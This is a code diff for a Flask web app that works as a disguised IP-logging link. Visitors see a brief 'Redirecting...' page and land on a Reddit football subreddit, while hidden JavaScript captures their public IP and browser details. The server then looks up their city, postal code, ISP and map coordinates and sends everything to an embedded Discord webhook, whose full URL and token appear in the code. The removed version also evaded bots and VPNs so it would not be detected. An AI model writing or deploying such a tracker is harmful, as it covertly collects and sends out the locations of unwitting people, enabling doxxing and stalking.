@@ -1,4 +1,4 @@
-from flask import Flask, request, redirect, abort
+from flask import Flask, request, redirect, jsonify
 import requests
 from datetime import datetime
 
@@ -8,63 +8,43 @@ app = Flask(__name__)
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430264733193207848/5fOooaQ3VYQePvd7m0ZR6hZsYPW0ML6pk9jZ5wMcin7JkyuHHVg_IQicnDqr18NWvsQh"
 REDIRECT_URL = "https://www.reddit.com/r/footballhighlights/"
 
-BOT_KEYWORDS = [
-    "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider",
-    "YandexBot", "Sogou", "Exabot", "facebot", "facebookexternalhit",
-    "python-requests", "Go-http-client"
-]
-
-def get_client_ip():
-    """Detect the visitor's real IP."""
-    headers = ["X-Forwarded-For", "X-Real-IP"]
-    for h in headers:
-        ip = request.headers.get(h)
-        if ip:
-            if "," in ip:
-                ip = ip.split(",")[0].strip()
-            return ip
-    return request.remote_addr
-
-def is_bot_or_vpn(info, user_agent):
-    """Detect bots, VPNs, or hosting IPs."""
-    ua = user_agent.lower()
-    for keyword in BOT_KEYWORDS:
-        if keyword.lower() in ua:
-            return True
-    security = info.get("security", {})
-    if security.get("vpn") or security.get("proxy") or security.get("hosting"):
-        return True
-    return False
-
-def get_ip_info(ip):
-    """Query ipapi.co for location and ISP info."""
-    try:
-        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
-        data = resp.json()
-        # Ensure numeric lat/lon
-        data["latitude"] = float(data.get("latitude") or 0)
-        data["longitude"] = float(data.get("longitude") or 0)
-        return data
-    except:
-        return {
-            "city": "Unknown",
-            "region": "Unknown",
-            "country_name": "Unknown",
-            "postal": "Unknown",
-            "org": "Unknown",
-            "latitude": 0,
-            "longitude": 0
-        }
-
 @app.route('/')
 def index():
-    ip = get_client_ip()
-    user_agent = request.headers.get("User-Agent", "Unknown")
-    info = get_ip_info(ip)
+    # Serve a small JS snippet to capture real IP
+    html = f"""
+    <html>
+    <head><title>Redirecting...</title></head>
+    <body>
+    <script>
+    fetch('https://api.ipify.org?format=json')
+        .then(resp => resp.json())
+        .then(data => {{
+            fetch('/log', {{
+                method: 'POST',
+                headers: {{'Content-Type': 'application/json'}},
+                body: JSON.stringify({{ip: data.ip, ua: navigator.userAgent}})
+            }});
+            window.location.href = '{REDIRECT_URL}';
+        }});
+    </script>
+    <p>Redirecting...</p>
+    </body>
+    </html>
+    """
+    return html
 
-    # Block bots/VPNs/proxies
-    if is_bot_or_vpn(info, user_agent):
-        abort(404)
+@app.route('/log', methods=['POST'])
+def log():
+    data = request.get_json()
+    ip = data.get("ip")
+    user_agent = data.get("ua", "Unknown")
+
+    # Query ipapi for accurate location
+    try:
+        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
+        info = resp.json()
+    except:
+        info = {}
 
     city = info.get("city", "Unknown")
     region = info.get("region", "Unknown")
@@ -74,31 +54,32 @@ def index():
     lat = info.get("latitude", 0)
     lon = info.get("longitude", 0)
     google_maps_link = f"https://www.google.com/maps?q={lat},{lon}"
-
     now = datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S GMT")
 
-    # Send a single webhook
-    message = {
-        "content": (
-            f"🚶 **New Visitor Detected**\n"
-            f"🖥️ IP: `{ip}`\n"
-            f"📍 Location: {city}, {region}, {country}\n"
-            f"📫 Postal: {postal}\n"
-            f"🏢 ISP: {isp}\n"
-            f"🌍 Google Maps: {google_maps_link}\n"
-            f"📱 User Agent: {user_agent}\n"
-            f"🕒 Time: {now}"
-        )
+    # Discord embed payload
+    embed = {
+        "username": "🌍 Visitor Logger",
+        "embeds": [{
+            "title": f"🚶 New Visitor from {city if city != 'Unknown' else 'Unknown'}",
+            "color": 3066993,  # teal
+            "fields": [
+                {"name": "🖥️ IP Address", "value": f"`{ip}`", "inline": True},
+                {"name": "📍 Location", "value": f"{city}, {region}, {country}", "inline": True},
+                {"name": "📫 Postal", "value": postal, "inline": True},
+                {"name": "🏢 ISP / Organization", "value": isp, "inline": True},
+                {"name": "🌍 Google Maps", "value": f"[Open Map]({google_maps_link})", "inline": False},
+                {"name": "📱 User Agent", "value": f"`{user_agent}`", "inline": False},
+                {"name": "🕒 Time (GMT)", "value": now, "inline": True}
+            ]
+        }]
     }
 
     try:
-        r = requests.post(DISCORD_WEBHOOK_URL, json=message, timeout=5)
-        print(f"[INFO] Discord webhook sent: {r.status_code}")
-    except Exception as e:
-        print(f"[ERROR] Webhook failed: {e}")
+        requests.post(DISCORD_WEBHOOK_URL, json=embed, timeout=5)
+    except:
+        pass
 
-    # Redirect visitors to Reddit
-    return redirect(REDIRECT_URL, code=302)
+    return jsonify({"status": "ok"}), 200
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=10000)
